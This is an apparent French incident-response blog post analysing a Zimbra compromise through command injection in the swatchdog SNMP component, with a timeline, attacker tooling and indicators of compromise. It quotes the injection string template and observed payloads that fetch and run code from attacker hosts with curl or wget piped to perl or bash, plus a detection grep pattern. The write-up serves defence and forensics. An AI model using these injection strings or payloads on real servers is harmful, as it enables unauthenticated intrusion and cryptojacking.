---
title: "Zimbra : quand un rejet SMTP déclenche l'exécution de code"
date: 2026-09-07
authors:
  - corentin
tags:
  - zimbra
  - dfir
  - forensic
  - injection-de-commande
  - threat-intelligence
  - rgpd
  - cryptominage
excerpt: Un serveur de messagerie Zimbra en fin de support, une vulnérabilité dans un composant de supervision, et une charge malveillante qui arrive par le message d'erreur d'un courriel rejeté. Récit d'une investigation, du vecteur d'injection jusqu'au portefeuille Monero de l'attaquant.
---

Un serveur de messagerie Zimbra, exposé sur Internet, quelques milliers de boîtes aux lettres, et une alerte du pare-feu sur un flux sortant inhabituel. Le point de départ tient en une ligne. Ce qui suit est le compte rendu de l'investigation, depuis le mécanisme d'injection jusqu'au portefeuille Monero de l'attaquant.

:::note[Anonymisation]
Tous les éléments permettant d'identifier l'organisation concernée ont été retirés : nom d'entité, noms de domaine, noms d'hôtes, adressage interne et comptes. Les dates absolues sont remplacées par une notation relative où **J** désigne la journée de la détection. Les indicateurs relatifs à l'infrastructure de l'attaquant sont conservés en l'état, puisqu'ils n'identifient que lui et présentent un intérêt défensif pour d'autres administrateurs.
:::

## Le décor

| Élément | Valeur |
|---|---|
| Système | Ubuntu 16.04, noyau 4.4.0 daté d'avril 2021 |
| Applicatif | Zimbra 8.7.11 FOSS, sorti en 2017 |
| Paquet en cause | `zimbra-snmp` 8.7.0, packagé pour Ubuntu 14.04 |
| Uptime au constat | 567 jours |
| Comptes hébergés | plus de 3 500 |
| Exposition | TCP/25, 465, 587, 110, 143, 993, 995, 443 |

Le système d'exploitation et l'applicatif sont l'un et l'autre sortis de support depuis plusieurs années. Un serveur dans cet état n'a besoin d'aucune vulnérabilité exotique pour tomber.

La vulnérabilité exploitée est **CVE-2026-73570**, corrigée par Zimbra le 20 juillet 2026 dans la version 10.1.20. CERT Polska signalait son exploitation active le 17 août, le CERT-FR publiait son avis le 19 août, la CISA l'ajoutait à son catalogue KEV le 21. Le serveur a été compromis dans la semaine qui a suivi.

## Le vecteur : une protection écrite, jamais branchée

La vulnérabilité se loge dans un composant annexe, `swatchdog`, un service de supervision fourni avec le paquet optionnel `zimbra-snmp`. Ce processus surveille en continu `/var/log/zimbra.log` et génère des trappes SNMP quand un service change d'état.

Le script Perl produit à partir de `/opt/zimbra/conf/swatchrc` contient une fonction de notification qui exécute une commande shell par le biais de guillemets obliques :

```perl
sub dosnmp {
    ...
    `$snmptrap $snmpsvctrap $snmpsvcname s $args{SERVICE} ...`;
}
```

La variable `$args{SERVICE}` provient d'une capture d'expression régulière opérée sur la ligne brute du journal :

```perl
if (/: Service status change: (\S+) (.*) changed from stopped to running/) {
    donotify('HOST' => "$1", 'SERVICE' => "$2", ...);
}
```

Le détail qui rend l'affaire remarquable se trouve un peu plus haut dans le script : une version échappée de la ligne de journal est bel et bien calculée, dans une variable `$S_`. Cette variable n'est jamais utilisée dans les branches de notification. L'auteur du code avait identifié le risque et écrit la protection. Elle n'a simplement pas été raccordée à l'endroit où elle servait.

## La charge arrive par le message d'erreur

Le déroulement complet demande quatre étapes :

1. L'attaquant envoie un message SMTP dont l'adresse d'expéditeur ou de destinataire contient la chaîne `Service status change: localhost $(commande) changed from stopped to running`.
2. Postfix rejette le message, puisque l'adresse est invalide, et journalise ce rejet dans `/var/log/zimbra.log`.
3. `swatchdog` lit cette ligne, la fait correspondre à son motif de surveillance, et transmet la capture à `dosnmp`.
4. Le shell exécute la charge sous l'identité du compte `zimbra`.

Le rejet du message par Postfix ne protège de rien. La ligne de journal produite par ce rejet transporte elle-même la charge jusqu'au composant vulnérable. Cette inversion a une conséquence pratique : durcir la configuration Postfix ou filtrer SNMP au pare-feu reste sans effet, puisque aucun paquet SNMP n'a besoin d'atteindre le serveur pour que l'exécution ait lieu.

Aucune authentification n'est requise. Toute personne capable d'envoyer un courriel au serveur peut y exécuter des commandes.

Sur la machine analysée, les quatre conditions d'exploitabilité étaient réunies : le paquet `zimbra-snmp` installé, `snmp_notify` positionné à `yes`, `swatchdog` actif sur `swatchrc`, et un script généré le matin même avec `$notifications{snmp}="yes"`.

## Chronologie

| Horodatage | Événement |
|---|---|
| J-3 | 4 tentatives d'injection journalisées |
| J-1 04:00 | Injection depuis `67.213.82.18` |
| J-1 10:17 | Injection depuis `65.109.133.169` |
| J-1 19:12 | Injection depuis `5.189.185.197` |
| J-1 | Démarrage de 6 processus `/bin/idle` |
| J 06:26 | Régénération du script `swatchdog` avec SNMP actif |
| J 09:20:43 | Injection depuis `150.242.14.129`, charge `curl 147.182.224.216/zed \| perl` |
| J 09:34:26 | Création de `/tmp/.xmjjdsdf` |
| J 09:34 → 09:56 | Création de `/dev/shm/.lrlwerorwrwrw/es` |
| J 10:26:23 | Injection depuis `154.70.152.215`, charge `curl 92.205.185.174/zedo \| perl` |
| J 11:03:30 | Injection depuis `5.83.143.5`, charge `wget 5.83.143.5:25 \| bash` |
| J 15:26 → 17:33 | Force brute SSH locale contre `root`, 12 135 échecs |
| J 16:11:38 | Connexion SSH sortante vers `88.80.150.25` |
| J 17:16:51 | `wtmp` vide à cette date, historique des connexions perdu |
| J 20:04 | Connexion sortante active vers `89.47.232.104:8080` |

Quinze injections observables au total, réparties sur trois jours, provenant de six adresses sources distinctes, avec quatre charges différentes. Le profil est celui d'une campagne opportuniste de masse. Un rapport public faisait état de 274 serveurs Zimbra compromis par cette même vulnérabilité à la date du 24 août.

Une limite tient à l'horizon d'observation. La crontab Zimbra purge les journaux de plus de huit jours. La date J-3 marque une borne d'observabilité, pas une date de début établie. Une compromission plus ancienne ne peut pas être écartée sur la seule base des journaux locaux.

## La preuve capturée en direct

Au moment du relevé, un processus issu de l'exploitation était encore visible dans la table des processus :

```
zimbra 29762 S 10:26 \_ sh -c /opt/zimbra/common/bin/snmptrap -v 2c -c zimbra
  <hote> '' ZIMBRA-TRAP-MIB::zmServiceStatusTrap
  ZIMBRA-MIB::zmServiceName s $(curl -sS 92.205.185.174/zedo|perl)
  ZIMBRA-MIB::zmServiceStatus i 1
```

Ce processus descend directement du script généré par `swatchdog`. Il relie sans ambiguïté la ligne d'injection journalisée à 10:26:23 et son exécution effective, ce qui en fait la pièce probante centrale du dossier. Une trace de journal seule aurait laissé place à la discussion sur l'aboutissement de la tentative.

## Ce que l'attaquant a déposé

Sept processus nommés `/bin/idle` tournaient sous l'identité `zimbra`. Le nom est un déguisement : le compte `zimbra` n'a pas de droit d'écriture dans `/bin`. Il s'agit de processus Perl qui redéfinissent `$0`, comportement caractéristique de la famille Shellbot et cohérent avec les charges se terminant par `| perl`.

Le contenu de `/dev/shm/.lrlwerorwrwrw/` a été extrait et analysé statiquement, sans exécution. L'ensemble est en clair, sans obfuscation, et s'organise en deux modules.

### Le module de monétisation

Un binaire de 5,2 Mo nommé `softwaretech`, qui est XMRig renommé, accompagné de sa configuration :

```json
"algo": "rx/0",
"url": "pool.supportxmr.com:3333",
"url": "rx.unmineable.com:3333",
"user": "83sgNtC4Fxgf5SHrFKcgaabku5wH8jruJ7Zkp5mVcSR4Np24RSRi7s1Q5j7aSk8eTjdFrpx57D3KuNdbFSQ24xZdFTaVtpp",
"max-threads-hint": 100,
"donate-level": 0
```

Autour du mineur, un outillage complet :

| Fichier | Fonction |
|---|---|
| `w3.sh` | Boucle de surveillance, relance le mineur s'il disparaît |
| `p.sh` | Élimine les mineurs concurrents (`xmrig`, `kdevtmpfsi`, `kinsing`, `minerd`, `xmr-stak`) |
| `x.sh`, `check3.sh` | Installeurs |
| `deploy.sh` | Déploiement et persistance |

Un commentaire laissé dans `check3.sh` en dit long sur l'échelle de l'opération : `Add UNIQUE worker name (so all 100 show up on the pool)`. L'opérateur administre une centaine de machines compromises et utilise le nom d'hôte de chaque victime comme identifiant de travailleur sur le pool de minage.

`deploy.sh` tente sept mécanismes de persistance à la suite : entrée `@reboot` en crontab utilisateur, écriture directe dans `/var/spool/cron/crontabs`, création de `/etc/cron.d/softwaretech-watchdog`, service systemd utilisateur, service systemd système, injection dans `/etc/rc.local`, et injection dans les profils shell. Les mécanismes exigeant `root` ont tous échoué.

### Le module de propagation

Le second répertoire contient une boîte à outils de recherche et de compromission d'hôtes SSH sur Internet :

| Composant | Taille | Nature |
|---|---|---|
| `ksmd` | 4,9 Mo | Binaire Go statique, force brute SSH multi-thread reposant sur `golang.org/x/crypto/ssh` |
| `ss` | 454 Ko | Masscan 32 bits statique, scan de ports en masse |
| `id` | 10 Mo | 632 863 noms de domaine cibles |
| `ips` | 226 Ko | 14 905 adresses IP cibles, toutes dans `138.201.0.0/16` |
| `pass.txt` et 24 listes | — | 52 928 couples identifiant / mot de passe |
| `banlist.txt` | 2,5 Ko | 213 entrées d'évitement, pots de miel et hôtes à ignorer |

Deux détails méritent l'attention. Les listes de mots de passe reposent sur des gabarits, `%domain%`, `%Domain%`, `%DOMAIN%`, `%firstword%`, `%TLD%`, qui dérivent les candidats du nom de domaine de la cible. Et `ksmd` embarque un mécanisme de licence à expiration, ce qui indique un outil loué par l'opérateur plutôt que développé par lui.

L'existence d'une `banlist.txt` de 213 entrées mérite aussi d'être notée : l'attaquant maintient sa propre liste de pots de miel connus, et prend soin de les éviter.

## L'élévation de privilèges qui n'aboutit pas

Entre 15:26 et 17:33, le journal d'authentification enregistre 12 135 échecs contre le compte `root` depuis `127.0.0.1` et `::1`, à une cadence d'environ 100 tentatives par minute. Le serveur se cassait les dents sur lui-même : la liste de cibles du module de scan inclut la boucle locale, et l'implant a simplement traité son propre hôte comme une victime potentielle. Le même module explique la connexion SSH sortante observée à 16:11:38.

Les 57 authentifications acceptées présentes dans le journal ont été examinées une par une. Elles se répartissent entre les sessions d'investigation depuis le poste d'administration et les authentifications par clé du compte `zimbra` vers lui-même, qui correspondent au mécanisme interne `zmrcd`. Aucune authentification `root` acceptée, aucune authentification par mot de passe, aucune source hors du périmètre d'administration.

La force brute a échoué. La compromission est restée cantonnée à l'identité applicative `zimbra`, ce qui écarte la modification du noyau, l'installation d'un rootkit et l'accès aux ressources réservées au superutilisateur. Les vérifications ont d'ailleurs confirmé l'absence d'altération sur les crontabs système, les timers systemd, `/etc/ld.so.preload`, les comptes disposant d'un shell et les webapps JSP.

## La question qui compte : et les données ?

C'est le point sur lequel une investigation de messagerie se juge, et celui qui déclenche les obligations réglementaires.

Le compte `zimbra` est propriétaire de l'ensemble de l'installation. Il lit le magasin de messages, la base MariaDB, l'annuaire LDAP contenant les empreintes de mots de passe, et il dispose de `zmmailbox`, qui extrait le contenu complet de n'importe quelle boîte sans authentification de son titulaire. La capacité technique d'accéder aux milliers de boîtes hébergées doit donc être considérée comme acquise pendant toute la durée de la compromission.

Plusieurs éléments plaident contre un accès effectif. Le journal d'audit applicatif de la journée J, portant sur 18 084 événements et 780 comptes distincts, ne fait apparaître aucune authentification depuis les adresses malveillantes, aucune connexion administrateur anormale, et aucun échec d'authentification. Le flux SSH sortant n'a transporté que 1 280 octets émis et 1 923 octets reçus, volume incompatible avec une exfiltration. L'analyse statique du code déposé ne révèle aucune fonction de lecture de messagerie, d'accès à la base, d'archivage ou d'exfiltration de contenu : la finalité est le détournement de ressource de calcul et de connectivité. Enfin, sur les 14 905 adresses de la liste de cibles, aucune n'est une adresse privée. Le serveur servait de plateforme de rebond vers l'extérieur, et aucun mouvement latéral vers le système d'information interne n'était préparé.

Ces éléments ne suffisent pas à conclure, et trois réserves doivent être posées.

Le journal d'audit enregistre les authentifications applicatives. Un accès aux messages réalisé localement sous l'identité `zimbra`, par `zmmailbox`, par lecture directe du magasin ou par requête SQL, ne produit aucune entrée. L'absence de trace ne vaut donc pas absence d'accès.

Le journal analysé ne couvre qu'une seule journée, alors que la compromission remonte au moins trois jours en arrière.

L'absence d'outil dédié n'exclut pas un accès manuel de l'opérateur au cours d'une session interactive. L'analyse statique décrit ce que le code automatise, pas ce qu'un humain a pu taper.

Conclusion retenue : l'accès à des données à caractère personnel a été techniquement possible pendant au moins trois jours. Il n'est ni démontré, ni écarté. En application du principe de précaution retenu par la CNIL, l'événement est qualifié de violation de données à caractère personnel au sens de l'article 4.12 du RGPD et notifié au titre de l'article 33.

### Le contrôle à ne pas oublier

Sur une plateforme de messagerie, le mode d'exfiltration le plus discret et le plus durable ne passe par aucun binaire : il suffit de créer une redirection automatique ou un filtre Sieve vers une adresse externe. Ce type de configuration survit à la remédiation si les comptes sont migrés en l'état.

Sur ce dossier, la première tentative de vérification a échoué en silence. Les commandes employées retournaient `account.NO_SUCH_DOMAIN`, la syntaxe étant incorrecte, et les fichiers de sortie sont restés vides. Un fichier vide ressemble beaucoup à un résultat négatif, et c'est précisément le piège. La syntaxe qui fonctionne :

```bash
su - zimbra
zmprov -l gaa -v <domaine> > /root/IR-attrs.txt
grep -iE '^# name|zimbraPrefMailForwardingAddress|zimbraMailSieveScript' \
  /root/IR-attrs.txt > /root/IR-forwards.txt
grep -c zimbraPrefMailForwardingAddress /root/IR-forwards.txt
```

Toute redirection vers un domaine externe doit ensuite être caractérisée individuellement comme légitime ou non, avant toute migration de comptes.

## Le volet Windows

Le dépôt GitHub utilisé comme hébergement secondaire de la charge Linux contenait également un script `update.ps1` ciblant les environnements Windows. Un conteneur PowerShell de six lignes, un tableau d'octets, et un reverse shell vers `43.228.157.73:8484` lançant `cmd.exe`.

La méthode d'extraction de cette adresse depuis le shellcode, avec les deux pièges d'ordre des octets qui produisent régulièrement un port faux, fait l'objet d'un article dédié : [Du tableau d'octets à l'adresse C2 : décoder un shellcode PowerShell](/blog/decoder-shellcode-powershell-adresse-c2/).

Ce composant change la portée de l'incident. La menace initiale visait un serveur Linux, et l'attaquant disposait sur la même infrastructure de quoi opérer sur un parc Windows. La vérification des flux sortants vers cette adresse et la recherche d'exécutions PowerShell anormales sur le parc bureautique deviennent des actions à part entière.

Le dépôt a été signalé à l'équipe Trust & Safety de GitHub le 31 août 2026, avec la charge Linux, le portefeuille Monero et la démarche permettant de retrouver l'adresse du serveur de commande. GitHub a confirmé le lendemain une violation de ses conditions d'utilisation et a supprimé le dépôt ainsi que le compte associé. Les liens de téléchargement utilisés par les charges d'exploitation ne répondent donc plus depuis cette plateforme.

## Indicateurs de compromission

Adresses sources des injections SMTP :

```
150.242.14.129
154.70.152.215
5.83.143.5
65.109.133.169
5.189.185.197
67.213.82.18
```

Infrastructures de charge et de commande :

```
147.182.224.216      (HTTP, /zed)
92.205.185.174       (HTTP, /zedo)
154.70.152.216       (HTTP, /zed)
5.83.143.5:25        (HTTP sur port 25)
89.47.232.104:8080   (C2 actif au moment du relevé)
88.80.150.25         (cible SSH sortante)
43.228.157.73:8484   (C2 du reverse shell Windows)
```

Les blocs `154.70.152.0/24` et `147.182.224.0/24` méritent une recherche dans l'ensemble des journaux de flux.

Hébergement secondaire de la charge, signalé à GitHub le 31 août 2026, dépôt et compte supprimés par GitHub le 1er septembre 2026 :

```
https://github.com/AlishaSharylz2/Windows-Update-Assistant
```

Portefeuille Monero et pools de minage :

```
83sgNtC4Fxgf5SHrFKcgaabku5wH8jruJ7Zkp5mVcSR4Np24RSRi7s1Q5j7aSk8eTjdFrpx57D3KuNdbFSQ24xZdFTaVtpp
pool.supportxmr.com:3333
rx.unmineable.com:3333
```

Indicateurs système :

```
/bin/idle                            (nom de processus, uid zimbra)
/tmp/.xmjjdsdf                       (répertoire)
/dev/shm/.lrlwerorwrwrw/             (répertoire)
$HOME/softwaretechreview             (répertoire d'installation)
softwaretech, w3.sh, p.sh, check3.sh (fichiers)
softwaretech-watchdog.service        (unité systemd)
/etc/cron.d/softwaretech-watchdog    (tâche planifiée)
```

Empreintes SHA-256 :

```
ksmd    6a492c0502daf671c5df8535a19b226b959b6ebb172d415f14c2e5cfb23041d7
ss      97093a1ef729cb954b2a63d7ccc304b18d0243e2a77d87bbbb94741a0290d762
es.tgz  96b30c0b356802cd8bd372240a485d69b65ba77577a5ae235b897db919807211
```

Recherche rapide du vecteur dans les journaux de messagerie :

```bash
grep -h 'Service status change' /var/log/zimbra.log* | grep -E '\$\(|\$\{IFS\}'
```

## Ce que je retiens

**Le composant vulnérable était optionnel.** `zimbra-snmp` n'était utilisé par personne sur cette installation. Un paquet installé par défaut, jamais exploité, jamais désinstallé, a ouvert une exécution de code non authentifiée. L'inventaire des composants réellement utiles fait partie du durcissement, au même titre que les correctifs.

**La détection existait dans les journaux, personne ne la lisait.** L'incident a été découvert par une alerte de flux sortant du pare-feu, environ 36 heures après les premières traces. Une règle portant sur les motifs `$(`, `${IFS}` ou les chaînes d'injection dans les journaux de messagerie aurait alerté trois jours plus tôt. Écrire cette règle prend dix minutes.

**Une mesure conservatoire non vérifiée n'est pas une mesure.** La désactivation de `snmp_notify` a été appliquée sur l'ensemble du parc, et s'est révélée sans effet sur au moins un serveur lors de la première passe : la modification de configuration ne s'applique pas aux processus déjà en cours d'exécution. Un contrôle de conformité après application doit être systématique.

**La perte de traces se constate trop tard.** Le fichier `wtmp` ne contenait plus aucune entrée antérieure à la première connexion d'investigation. L'historique des connexions est perdu, et la cause n'est pas établie. Un serveur qui n'exporte pas ses journaux ailleurs offre à l'attaquant la maîtrise de sa propre chronologie.

**L'écart entre capacité et intention structure l'analyse de risque.** L'attaquant pouvait tout lire. Rien dans son outillage n'était fait pour cela. Cette distinction n'autorise aucune conclusion rassurante, elle oblige à qualifier proprement ce qui est démontré, ce qui est écarté, et ce qui reste ouvert. Les trois catégories doivent apparaître distinctement dans le rapport, sinon le lecteur tranche à votre place.

Sur le plan méthodologique, la pièce qui a le plus de valeur dans ce dossier est un processus encore vivant dans `ps` au moment du relevé. Les journaux prouvent une tentative. Un processus en cours prouve une exécution. Un instantané complet de la table des processus, pris avant toute action de remédiation, coûte une commande et vaut plus que des heures de reconstruction ultérieure.

Je ne suis pas analyste DFIR de métier. Cette investigation a été menée avec les outils disponibles et le temps disponible. Les corrections et compléments de personnes dont c'est le quotidien sont bienvenus.

## Sources

- [CERT-FR — CERTFR-2026-AVI-1041, Multiples vulnérabilités dans Synacor Zimbra Collaboration](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1041/)
- [The Hacker News — Attackers Exploit Zimbra SNMP Flaw for Unauthenticated Remote Code Execution](https://thehackernews.com/2026/08/attackers-exploit-zimbra-snmp-flaw-for.html)
- [BetaNews — Zimbra SNMP flaw actively exploited, 274 servers hit](https://betanews.com/article/zimbra-snmp-flaw-274-servers-compromised/)
